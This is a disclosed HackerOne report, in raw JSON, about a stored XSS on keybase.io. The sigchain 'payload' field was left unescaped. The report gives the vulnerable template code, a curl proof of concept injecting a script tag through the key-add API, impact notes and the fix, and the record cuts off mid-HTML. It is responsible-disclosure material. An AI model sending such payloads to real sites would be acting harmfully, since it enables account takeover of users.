{"id":245296,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDUyOTY=","url":"https://hackerone.com/reports/245296","title":"Persistent XSS on keybase.io via \"payload\" field in `/user/sigchain_signature.toffee` template","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-07-02T09:42:52.752Z","submitted_at":"2017-07-02T09:42:52.752Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jordanmilne","url":"/jordanmilne","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2809,"url":"https://hackerone.com/keybase","handle":"keybase","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Keybase","twitter_handle":"keybaseio","website":"https://keybase.io","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-03-14T15:15:33.139Z","bug_reporter_agreed_on_going_public_at":"2017-08-20T03:34:45.248Z","team_member_agreed_on_going_public_at":"2019-03-14T15:15:33.017Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Issue\n\nKeybase allows you to see other users' sigchains by navigating to \u003chttps://keybase.io/\u003cusername\\\u003e/sigchain\u003e. The \"Payload\" field containing JSON related to the chainlink on the right side of the page is not correctly escaped during templating, leading to a persistent XSS as users have a high degree of control over the contents of that field.\n\nSpecifically, the `/user/sigchain_signature.toffee` template's compiled code contains:\n\n```js\n// ...\n                _to('      \u003ctextarea wrap=\"off\" class=\"form-control fixed full-payload autoselect\" rows=\"20\" autocapitalize=\"off\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" readonly\u003e');\n                _to(\"\" + JSON.stringify(JSON.parse(sig.payload_json), null, 2)); // \u003c `payload_json` is user-controlled and not escaped!\n                _to(\"\u003c/textarea\u003e\\n\");\n// ...\n```\n\nwhere normally there would be an `escape()` around the data being interpolated in to prevent special characters being interpreted as HTML.\n\n## Proof-of-Concept\n\n* Create a new account on https://keybase.io or remove all keys / associations from an existing account\n* Generate a GPG keypair locally and upload the public half via https://keybase.io. Make sure you import these into your GPG keychain.\n* When the site asks you to upload the private half, select \"maybe another time\", then select the option to sign the pubkey with \"command line with [bash + GPG + cURL]\"\n* keybase.io will spit out a few lines of bash to paste into your terminal, copy this to a text editor.\n* Replace `\"tag\":\"signature\"` section of the JSON payload in the cURL command with `\"tag\":\"\u003c/textarea\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\"`. There's no particular reason we have to inject into the `tag` field, it was just the first field I saw that wasn't validated and was reflected in the \"payload\" field on the sigchain page.\n\nYou should have something like:\n\n```bash\ncurl \\\n  --data-urlencode sig=\"`\\\n   echo '{\"body\":{\"key\":{\"eldest_kid\":\"01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\",\"fingerprint\":\"b54bac1da5887ffba91411894f6b7c0c98dc7571\",\"full_hash\":\"3ef468ca735aacdc3beee8f8ac1f88c4441a01a583598871721cd390d74fa465\",\"host\":\"keybase.io\",\"key_id\":\"4f6b7c0c98dc7571\",\"kid\":\"01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\",\"uid\":\"81d7b93a686f9bc7ff566eeb87bc8719\",\"username\":\"largenotesting\"},\"type\":\"eldest\",\"version\":1},\"ctime\":1498970799,\"expire_in\":157680000,\"prev\":\"d87dd6918ff960578d29d8c9fd47cfdd8256bc46ed288ff7475522574134a1a0\",\"seqno\":19,\"tag\":\"\u003c/textarea\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\"}' | \\\n   gpg -u 'b54bac1da5887ffba91411894f6b7c0c98dc7571' -a --sign`\" \\\n  --data-urlencode type=\"eldest\" \\\n  --data-urlencode session=\"\u003cSESSION KEY\u003e\" \\\n  --data-urlencode csrf_token=\"\u003cCSRF TOKEN\u003e\" \\\n  --data-urlencode plain_out=\"1\" \\\n  --data-urlencode signing_kid=\"01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\" \\\n  --data-urlencode public_key=\"-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: GnuPG v2\n\nmQENBFlYeiwBCADMIXo7d47rJpWwBVqr/obUBb0NpTh7cPnhSeoYPaIRVCPOm6ep\nHVOveqSheiIAJMVu+7sv70t67TTfszCp5lPCpgoGcotb74Eze7aF5DnoBY/kjGUt\n1PwoiMvoTgmoXikWmPd24qb2+2kRRyCSsq93Dd8/Vk1DAcDxzRbvxlLCsFGWfNmr\nRmPYB31U8OuPp7n9+FqEAWXVxFl/5AswpfRhekwG1ujlRzv4Ufpnb1PGVTdhwI0j\n/+Mk+7gK5MqcbGUT/W2O0M01onWN0Xg8pDBliR2D2ePpI08GxV0BnBYhCWgYI683\nRWrgTuSaHNdS3TqwULehYKNSqB3U2OTsdL9ZABEBAAG0KXNvbWV0aGluZyA8YW5v\ndGhlcmtleWJhQHNheW5vdG9saW51eC5jb20+iQE3BBMBCAAhBQJZWHosAhsDBQsJ\nCAcCBhUICQoLAgQWAgMBAh4BAheAAAoJEE9rfAyY3HVxgLcH/RdkDjwgLwmIiOzh\nJY/EzcVApSqMWLEO7JQZCHUgJNq/h7HY6uHd12uEAirP+QRpDIE1h98YSeIxQLAR\niWrmST/tR9PhmeUN1pYJfuPEW8PLDkefrKde+0XhvWoOzTvQNiYFGlCnP9BIiJky\nGzC0Tb7Dg8iVe032QjYCbqNyQkWmQ9ztM+j+mPHKTfMC1hzU+lOt4nexWlTSf/z6\n4GURt131gIVBuQu7pm61QZP/u+dPdazho1ikmASNHHYkAnJFzMWQ7GDi7Lqns/mB\nW7XFEqbT4dOSeEOVkckiPNDcVFgdhPiDTm4VWzQAsYU/Zr3AhcxuBSQT6l11fvWb\nEmuWeFa5AQ0EWVh6LAEIAMOJF/a1Tz7Nwa5+FhpbBX0svIzpPCfREdDg0kO0cKWU\n81IWZZrDHqmlfxCnqPyB7XfrwFb40gIbBmi6mrZb5COo5pDQ7uE+cWn5cmpVVOqx\nkEjX8jEd0SzO5kBFevlVHlGrcO23tm2FuKZBHf69u2U15ivYijceJFnRCCyW0RFQ\nCz9Rz9XBkth6x3SswBZQAT2qAaBnVwQv/YzleBH2cCUSxMkjLE8zjkFL8W+zEVGw\n9NyWQHJ/TmaHeAojvRisJ1MyIpRLhFDn8h5PYuvZs8XRK7pen+PznIAtuYYfENCR\n7tPqAp4yFkKhOBy7zQB9PUOoaZWxRwUs4HoDIkNSnWcAEQEAAYkBHwQYAQgACQUC\nWVh6LAIbDAAKCRBPa3wMmNx1ceKnB/905aQn5eJDo7Dva0AjDjYL6+mSf1eeMElF\nUUhqR3/ZVUrla5xX3N1wvnC5YfBAjXY4WpRtDFfNR35EA31kP8biAWs1bgaPybyr\nJZqHD7DQS+tccHKQd/ovNg5qFIh8KKv1pMI66n1GtG4C6btz8cbxhUj1WYfBbxdR\negSWT5WEP+lm3+iSGg4C/yPOpvqdx7ORCLvje8v9lQ8XMOPwclvYsZKuydi4anT0\nsy7LbithYRusQrkO40qiTgsD6YHGZiN++SscMg04RYgRz/F37hYeWhZqwsnq4mt3\nlzONWNX5pQsSbP0dAiJvh8otImITQFUUnfu5z+jJCXdze9/2FV8z\n=1hmO\n-----END PGP PUBLIC KEY BLOCK-----\" \\\n  --data-urlencode is_primary=\"true\" \\\n  --data-urlencode sig_required=\"true\" \\\n  https://keybase.io/_/api/1.0/key/add.json\n```\n* Run the command, then go to \u003chttps://keybase.io/\u003cYOUR_USERNAME\\\u003e/sigchain\u003e. You should see an `alert()` box pop.\n\nI can also make a profile that repros this issue if you like, I've cleared my profile since verifying this was an issue.\n\n## Impact\n\nIt seems like _most_ sensitive functionality on keybase.io is behind a password re-entry wall, so if the victim didn't have a password manager that would autopopulate password fields on https://keybase.io the attacker would have to dump a fake login prompt into the DOM to be able to do anything \"interesting\". I suppose an attacker would at least be able to pull down the user's TripleSec-encrypted privkey bundles to perform an offline attack without any special user interaction.\n\nHowever, the frontend JS references some admin-only API endpoints (viewing crashlogs, billing stuff, etc) that don't seem to require password re-auth. An XSS in the context of an admin user's session would probably allow an attacker to abuse those endpoints.\n\n## Remediation\n\nThe \"payload\" JSON should be escaped in the template like anything else in a text node. More generally, more of web frontend code should be switched to modern HTML templating techniques. There's a number of suspect instances of semi-user-controlled data being passed into HTML sinks like `$.html()`, `$.append()`, `$.prepend()`, etc.\n\nThe web frontend would also be a good candidate for CSP with nonces, since it doesn't seem to pull in third-party resources other than statics from S3, and that would have mitigated this XSS in most modern browsers.\n\nJust let me know if you need any more details! Also, hi @chromakode!","vulnerability_information_html":"\u003ch2 id=\"issue\"\u003eIssue\u003c/h2\u003e\n\n\u003cp\u003eKeybase allows you to see other users\u0026#39; sigchains by navigating to \u003ca title=\"https://keybase.io/%3Cusername%3E/sigchain\" href=\"/redirect?url=https%3A%2F%2Fkeybase.io%2F%253Cusername%253E%2Fsigchain\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://keybase.io/%3Cusername%3E/sigchain\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The \u0026quot;Payload\u0026quot; field containing JSON related to the chainlink on the right side of the page is not correctly escaped during templating, leading to a persistent XSS as users have a high degree of control over the contents of that field.\u003c/p\u003e\n\n\u003cp\u003eSpecifically, the \u003ccode\u003e/user/sigchain_signature.toffee\u003c/code\u003e template\u0026#39;s compiled code contains:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// ...\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003e_to\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e      \u0026lt;textarea wrap=\u0026quot;off\u0026quot; class=\u0026quot;form-control fixed full-payload autoselect\u0026quot; rows=\u0026quot;20\u0026quot; autocapitalize=\u0026quot;off\u0026quot; autocorrect=\u0026quot;off\u0026quot; autocomplete=\u0026quot;off\u0026quot; spellcheck=\u0026quot;false\u0026quot; readonly\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003e_to\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esig\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload_json\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u0026lt; `payload_json` is user-controlled and not escaped!\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003e_to\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;/textarea\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// ...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewhere normally there would be an \u003ccode\u003eescape()\u003c/code\u003e around the data being interpolated in to prevent special characters being interpreted as HTML.\u003c/p\u003e\n\n\u003ch2 id=\"proof-of-concept\"\u003eProof-of-Concept\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eCreate a new account on \u003ca title=\"https://keybase.io\" href=\"/redirect?url=https%3A%2F%2Fkeybase.io\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://keybase.io\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e or remove all keys / associations from an existing account\u003c/li\u003e\n\u003cli\u003eGenerate a GPG keypair locally and upload the public half via \u003ca title=\"https://keybase.io\" href=\"/redirect?url=https%3A%2F%2Fkeybase.io\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://keybase.io\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Make sure you import these into your GPG keychain.\u003c/li\u003e\n\u003cli\u003eWhen the site asks you to upload the private half, select \u0026quot;maybe another time\u0026quot;, then select the option to sign the pubkey with \u0026quot;command line with [bash + GPG + cURL]\u0026quot;\u003c/li\u003e\n\u003cli\u003ekeybase.io will spit out a few lines of bash to paste into your terminal, copy this to a text editor.\u003c/li\u003e\n\u003cli\u003eReplace \u003ccode\u003e\u0026quot;tag\u0026quot;:\u0026quot;signature\u0026quot;\u003c/code\u003e section of the JSON payload in the cURL command with \u003ccode\u003e\u0026quot;tag\u0026quot;:\u0026quot;\u0026lt;/textarea\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026quot;\u003c/code\u003e. There\u0026#39;s no particular reason we have to inject into the \u003ccode\u003etag\u003c/code\u003e field, it was just the first field I saw that wasn\u0026#39;t validated and was reflected in the \u0026quot;payload\u0026quot; field on the sigchain page.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eYou should have something like:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e--data-urlencode\u003c/span\u003e \u003cspan class=\"nv\"\u003esig\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n   \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026quot;body\u0026quot;:{\u0026quot;key\u0026quot;:{\u0026quot;eldest_kid\u0026quot;:\u0026quot;01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\u0026quot;,\u0026quot;fingerprint\u0026quot;:\u0026quot;b54bac1da5887ffba91411894f6b7c0c98dc7571\u0026quot;,\u0026quot;full_hash\u0026quot;:\u0026quot;3ef468ca735aacdc3beee8f8ac1f88c4441a01a583598871721cd390d74fa465\u0026quot;,\u0026quot;host\u0026quot;:\u0026quot;keybase.io\u0026quot;,\u0026quot;key_id\u0026quot;:\u0026quot;4f6b7c0c98dc7571\u0026quot;,\u0026quot;kid\u0026quot;:\u0026quot;01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\u0026quot;,\u0026quot;uid\u0026quot;:\u0026quot;81d7b93a686f9bc7ff566eeb87bc8719\u0026quot;,\u0026quot;username\u0026quot;:\u0026quot;largenotesting\u0026quot;},\u0026quot;type\u0026quot;:\u0026quot;eldest\u0026quot;,\u0026quot;version\u0026quot;:1},\u0026quot;ctime\u0026quot;:1498970799,\u0026quot;expire_in\u0026quot;:157680000,\u0026quot;prev\u0026quot;:\u0026quot;d87dd6918ff960578d29d8c9fd47cfdd8256bc46ed288ff7475522574134a1a0\u0026quot;,\u0026quot;seqno\u0026quot;:19,\u0026quot;tag\u0026quot;:\u0026quot;\u0026lt;/textarea\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026quot;}\u0026#39;\u003c/span\u003e | \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n   gpg \u003cspan class=\"nt\"\u003e-u\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;b54bac1da5887ffba91411894f6b7c0c98dc7571\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-a\u003c/span\u003e \u003cspan class=\"nt\"\u003e--sign\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e--data-urlencode\u003c/span\u003e \u003cspan class=\"nb\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;eldest\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e--data-urlencode\u003c/span\u003e \u003cspan class=\"nv\"\u003esession\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026lt;SESSION KEY\u0026gt;\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e--data-urlencode\u003c/span\u003e \u003cspan class=\"nv\"\u003ecsrf_token\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026lt;CSRF TOKEN\u0026gt;\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e--data-urlencode\u003c/span\u003e \u003cspan class=\"nv\"\u003eplain_out\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e--data-urlencode\u003c/span\u003e \u003cspan class=\"nv\"\u003esigning_kid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e--data-urlencode\u003c/span\u003e \u003cspan class=\"nv\"\u003epublic_key\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: GnuPG v2\n\nmQENBFlYeiwBCADMIXo7d47rJpWwBVqr/obUBb0NpTh7cPnhSeoYPaIRVCPOm6ep\nHVOveqSheiIAJMVu+7sv70t67TTfszCp5lPCpgoGcotb74Eze7aF5DnoBY/kjGUt\n1PwoiMvoTgmoXikWmPd24qb2+2kRRyCSsq93Dd8/Vk1DAcDxzRbvxlLCsFGWfNmr\nRmPYB31U8OuPp7n9+FqEAWXVxFl/5AswpfRhekwG1ujlRzv4Ufpnb1PGVTdhwI0j\n/+Mk+7gK5MqcbGUT/W2O0M01onWN0Xg8pDBliR2D2ePpI08GxV0BnBYhCWgYI683\nRWrgTuSaHNdS3TqwULehYKNSqB3U2OTsdL9ZABEBAAG0KXNvbWV0aGluZyA8YW5v\ndGhlcmtleWJhQHNheW5vdG9saW51eC5jb20+iQE3BBMBCAAhBQJZWHosAhsDBQsJ\nCAcCBhUICQoLAgQWAgMBAh4BAheAAAoJEE9rfAyY3HVxgLcH/RdkDjwgLwmIiOzh\nJY/EzcVApSqMWLEO7JQZCHUgJNq/h7HY6uHd12uEAirP+QRpDIE1h98YSeIxQLAR\niWrmST/tR9PhmeUN1pYJfuPEW8PLDkefrKde+0XhvWoOzTvQNiYFGlCnP9BIiJky\nGzC0Tb7Dg8iVe032QjYCbqNyQkWmQ9ztM+j+mPHKTfMC1hzU+lOt4nexWlTSf/z6\n4GURt131gIVBuQu7pm61QZP/u+dPdazho1ikmASNHHYkAnJFzMWQ7GDi7Lqns/mB\nW7XFEqbT4dOSeEOVkckiPNDcVFgdhPiDTm4VWzQAsYU/Zr3AhcxuBSQT6l11fvWb\nEmuWeFa5AQ0EWVh6LAEIAMOJF/a1Tz7Nwa5+FhpbBX0svIzpPCfREdDg0kO0cKWU\n81IWZZrDHqmlfxCnqPyB7XfrwFb40gIbBmi6mrZb5COo5pDQ7uE+cWn5cmpVVOqx\nkEjX8jEd0SzO5kBFevlVHlGrcO23tm2FuKZBHf69u2U15ivYijceJFnRCCyW0RFQ\nCz9Rz9XBkth6x3SswBZQAT2qAaBnVwQv/YzleBH2cCUSxMkjLE8zjkFL8W+zEVGw\n9NyWQHJ/TmaHeAojvRisJ1MyIpRLhFDn8h5PYuvZs8XRK7pen+PznIAtuYYfENCR\n7tPqAp4yFkKhOBy7zQB9PUOoaZWxRwUs4HoDIkNSnWcAEQEAAYkBHwQYAQgACQUC\nWVh6LAIbDAAKCRBPa3wMmNx1ceKnB/905aQn5eJDo7Dva0AjDjYL6+mSf1eeMElF\nUUhqR3/ZVUrla5xX3N1wvnC5YfBAjXY4WpRtDFfNR35EA31kP8biAWs1bgaPybyr\nJZqHD7DQS+tccHKQd/ovNg5qFIh8KKv1pMI66n1GtG4C6btz8cbxhUj1WYfBbxdR\negSWT5WEP+lm3+iSGg4C/yPOpvqdx7ORCLvje8v9lQ8XMOPwclvYsZKuydi4anT0\nsy7LbithYRusQrkO40qiTgsD6YHGZiN++SscMg04RYgRz/F37hYeWhZqwsnq4mt3\nlzONWNX5pQsSbP0dAiJvh8otImITQFUUnfu5z+jJCXdze9/2FV8z\n=1hmO\n-----END PGP PUBLIC KEY BLOCK-----\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e--data-urlencode\u003c/span\u003e \u003cspan class=\"nv\"\u003eis_primary\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;true\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e--data-urlencode\u003c/span\u003e \u003cspan class=\"nv\"\u003esig_required\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;true\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n  https://keybase.io/_/api/1.0/key/add.json\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eRun the command, then go to \u003ca title=\"https://keybase.io/%3CYOUR_USERNAME%3E/sigchain\" href=\"/redirect?url=https%3A%2F%2Fkeybase.io%2F%253CYOUR_USERNAME%253E%2Fsigchain\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://keybase.io/%3CYOUR_USERNAME%3E/sigchain\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. You should see an \u003ccode\u003ealert()\u003c/code\u003e box pop.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI can also make a profile that repros this issue if you like, I\u0026#39;ve cleared my profile since verifying this was an issue.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIt seems like \u003cu\u003emost\u003c/u\u003e sensitive functionality on keybase.io is behind a password re-entry wall, so if the victim didn\u0026#39;t have a password manager that would autopopulate password fields on \u003ca title=\"https://keybase.io\" href=\"/redirect?url=https%3A%2F%2Fkeybase.io\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://keybase.io\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e the attacker would have to dump a fake login prompt into the DOM to be able to do anything \u0026quot;interesting\u0026quot;. I suppose an attacker would at least be able to pull down the user\u0026#39;s TripleSec-encrypted privkey bundles to perform an offline attack without any special user interaction.\u003c/p\u003e\n\n\u003cp\u003eHowever, the frontend JS references some admin-only API endpoints (viewing crashlogs, billing stuff, etc) that don\u0026#39;t seem to require password re-auth. An XSS in the context of an admin user\u0026#39;s session would probably allow an attacker to abuse those endpoints.\u003c/p\u003e\n\n\u003ch2 id=\"remediation\"\u003eRemediation\u003c/h2\u003e\n\n\u003cp\u003eThe \u0026quot;payload\u0026quot; JSON should be escaped in the template like anything else in a text node. More generally, more of web frontend code should be switched to modern HTML templating techniques. There\u0026#39;s a number of suspect instances of semi-user-controlled data being passed into HTML sinks like \u003ccode\u003e$.html()\u003c/code\u003e, \u003ccode\u003e$.append()\u003c/code\u003e, \u003ccode\u003e$.prepend()\u003c/code\u003e, etc.\u003c/p\u003e\n\n\u003cp\u003eThe web frontend would also be a good candidate for CSP with nonces, since it doesn\u0026#39;t seem to pull in third-party resources other than statics from S3, and that would have mitigated this XSS in most modern browsers.\u003c/p\u003e\n\n\u003cp\u003eJust let me know if you need any more details! Also, hi \u003ca href=\"/chromakode\"\u003e@chromakode\u003c/a\u003e!\u003c/p\u003e\n","bounty_amount":"3000.0","formatted_bounty":"$3,000","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":263,"voters":["mirchr","notpwnguy","danielmgm","jordanmilne","fersingb","spaceraccoon","michiel","troubleshooter","0xbeefed","base_64","and 253 more..."],"severity":{"rating":"high","score":8.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"low"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1797892,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"hey Jordan - thanks for this. I confirmed it's an error and a good one at that.  I just released a quick patch that I believe fixes it. Can you confirmed it's fixed for you? ","markdown_message":"\u003cp\u003ehey Jordan - thanks for this. I confirmed it\u0026#39;s an error and a good one at that.  I just released a quick patch that I believe fixes it. Can you confirmed it\u0026#39;s fixed for you? \u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-02T19:02:34.124Z","updated_at":"2017-07-02T19:02:34.124Z","actor":{"url":"/keybase","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Keybase"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"keybase","collaborator":{"username":"jordanmilne","url":"/jordanmilne"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1798116,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"```js\n                reformatted = JSON.stringify(JSON.parse(sig.payload_json), null, 2);\n                // ...\n                _to('      \u003ctextarea wrap=\"off\" class=\"form-control fixed full-payload autoselect\" rows=\"20\" autocapitalize=\"off\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" readonly\u003e');\n                _to(\"\" + (reformatted != null ? escape(reformatted) : \"\"));\n                _to(\"\u003c/textarea\u003e\\n\");\n```\n\nYep, this looks correct and [the bug no longer repros](https://keybase.io/largenotesting/sigchain#8c8eec6dc19890f759ad2461514794c2f61b856937636d277c88106f1f842b430f). \n\nThe hotfix confused me at first, but I'm guessing this has to do with [Toffee bypassing autoescaping if the interpolated expression starts with `JSON.stringify`](https://github.com/malgorithms/toffee/blob/5fd1722a1dbbdf3c42ed18b505c186888bfef390/src/view.coffee#L360), and the fix would be to wrap it in `__toffee.json`'s escaping logic?","markdown_message":"\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e                \u003cspan 